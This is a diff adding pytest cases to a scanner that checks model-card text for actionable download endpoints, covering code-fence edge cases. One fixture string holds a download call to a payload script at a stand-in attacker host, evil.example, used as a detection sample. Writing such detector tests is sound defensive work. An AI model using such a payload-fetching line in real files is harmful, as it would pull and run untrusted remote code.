@@ -2319,6 +2319,21 @@ def test_text_scanner_markdown_link_in_open_call_remains_actionable(
     )
 
 
+@pytest.mark.parametrize("fence", ["```", "~~~", "````"])
+def test_text_scanner_incomplete_fence_preserves_open_call(tmp_path: Path, fence: str) -> None:
+    _assert_model_card_payload_endpoint_actionable(
+        tmp_path, f"download(\n{fence}\n[payload](https://evil.example/payload.sh)\n)\n"
+    )
+
+
+@pytest.mark.parametrize("fence", ["```", "~~~", "````"])
+@pytest.mark.parametrize("example", ['download(\n    "local"\n)\n', "download(\n"])
+def test_text_scanner_closed_fence_does_not_extend_call_into_prose(tmp_path: Path, fence: str, example: str) -> None:
+    _assert_model_card_endpoint_informational(
+        tmp_path, f"{fence}python\n{example}{fence}\n[guide](https://docs.example.com/reference)\n"
+    )
+
+
 @pytest.mark.parametrize("padding", [MAX_TEXT_FINDING_CONTEXT_BYTES - 16, MAX_TEXT_FINDING_CONTEXT_BYTES + 16])
 def test_text_scanner_long_prose_before_markdown_link_is_informational(tmp_path: Path, padding: int) -> None:
     _assert_model_card_endpoint_informational(
